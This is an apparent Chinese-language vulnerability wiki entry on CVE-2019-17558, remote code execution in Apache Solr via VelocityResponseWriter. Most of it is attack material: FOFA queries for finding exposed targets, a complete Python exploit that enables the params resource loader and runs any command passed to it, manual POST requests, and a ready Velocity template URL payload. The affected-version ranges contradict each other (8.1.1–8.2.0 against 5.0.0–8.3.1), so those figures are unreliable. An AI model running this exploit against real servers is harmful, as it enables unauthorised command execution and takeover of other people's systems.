

## CVE-2019-17558 | Apache Solr  8.1.1 >= 8.2.0 存在RCE漏洞





## 0x00 漏洞说明



在 Apache Solr 5.0.0 到 8.3.1版本，存在通过 VelocityResponseWriter ([Velocity响应编写器](https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html)) 进行远程代码执行的漏洞。



## 0x01 影响版本



- `>= Apache Solr 8.1.1`
- `<= Apache Solr 8.2.0`



## 0x02 漏洞成因



1. 攻击者可以通过设置`params.resource.loader.enabled`为 `true` 来启用params资源加载器，随后攻击者可以为[Velocity响应编写器](https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html)提供配置集。

1. 当params资源加载器 收到可渲染的、包含恶意代码的配置集时，将造成RCE漏洞。

   



## 0x03 漏洞指纹



fofa:

```
app="apache-solr"
title="Solr Admin"
```





## 0x04 POC & EXP



!FILENAME EXP.py

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Author:gshell

import sys
import os
import requests
import json

auth = """
   ___               _____        __         __   __
  / _ )  __ __      / ___/  ___  / /  ___   / /  / /
 / _  | / // /     / (_ /  (_-< / _ \/ -_) / /  / / 
/____/  \_, /      \___/  /___//_//_/\__/ /_/  /_/  
       /___/
====================================================

"""

def get_core_name(url):
    if url[-1] == '/':
        url = url[:-1].split('\n')[0]
    else:
        url = url.split('\n')[0]
    print ('[+] target_url： {}'.format(url))
    cores_url = url + '/solr/admin/cores?indexInfo=false&wt=json'
    print ('[+] Cores_Name： {}\n'.format(cores_url))
    print ('====================================================')

    r = requests.get(cores_url)
    if r.status_code == 200 and 'responseHeader' in r.text and 'status' in r.text:
        json_str = json.loads(r.text)

        for key in json_str['status']:
            core_name_url = url + '/solr/' + key + '/config'
            exploit(core_name_url)
        
    else:
        print("no core_name, try to create please")

def exploit(url):
    solr_headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0", 
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", 
    "Accept-Encoding": "gzip, deflate", 
    "Connection": "close", 
    "Upgrade-Insecure-Requests": "1", 
    "Cache-Control": "max-age=0", 
    "Content-Type": "application/json"
    }

    solr_json = {"update-queryresponsewriter": {"class": "solr.VelocityResponseWriter", 
    "name": "velocity", 
    "params.resource.loader.enabled": "true", 
    "solr.resource.loader.enabled": "true", 
    "startup": "lazy", 
    "template.base.dir": ""}}
    # proxies = {"http":"http://127.0.0.1:8080"}
    r = requests.post(url, headers=solr_headers, json=solr_json)
    if r.status_code == 200 and 'responseHeader' in r.text:
        print("[+] target maybe vulnerable!")
        solr_url = url[:-7]
        # print(solr_url)
        cmd = sys.argv[2]
        solr_exp(solr_url,cmd)
    else:
        print ("[+] target is not vulnerable\n")

def solr_exp(url,cmd):
    url = url + r"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27" + cmd + r"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
    r = requests.get(url)
    if r.status_code == 400 or r.status_code == 500  or r.status_code ==200 and len(r.content) >0:
        print ("[+] solr_rce exploit Successful!")
        print ('\nvulnerable url： {}'.format(url))
        print ('\nsolr__response： {}'.format(r.text))
        print ('====================================================\n')
    else:
        print ("!!! [+] solr exploit failed! !!!")

if __name__ == '__main__':
    print(auth)
    if len(sys.argv) != 3:
        sys.exit("\n [!] Usage:  python3 %s url cmd\n" % sys.argv[0])
    else:
        url = sys.argv[1]
        get_core_name(url)
```



图形化利用工具:

```
https://github.com/SDNDTeam/CVE-2019-17558_Solr_Vul_Tool/
```





## 0x05 详细利用过程



首先，通过API获取内核名称

```json
POST:http://ip:8983/solr/admin/cores?indexInfo=false&wt=json
```



影响内容:

```json
{
    
    
  "responseHeader":{
    
    
    "status":0,
    "QTime":0},
  "initFailures":{
    
    },
  "status":{
    
    
    "demo":{
    
    
      "name":"demo", //这里就是内核名
      "instanceDir":"/var/solr/data/demo",
      "dataDir":"/var/solr/data/demo/data/",
      "config":"solrconfig.xml",
      "schema":"managed-schema",
      "startTime":"2020-07-06T12:16:23.482Z",
      "uptime":3756216
    }
  }
}
```





发送POST请求，开启 `params.resource.loader.enabled `配置



```json
POST /solr/demo/config HTTP/1.1 //将内核名添加到路径 sorl/后
Host: xxx:8983
Content-Type: application/json
Content-Length: 259

{
    
    
  "update-queryresponsewriter": {
    
    
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
```



通过 `Velocity`模板执行`whoami`命令

```
http://xxx:8983/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
```





## 0x06 扩展链接



[CVE-2019-17558 NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-17558)



[Velocity响应编写器](https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html)



## 0x07 联系方式



作者 : BitWiki支持团队
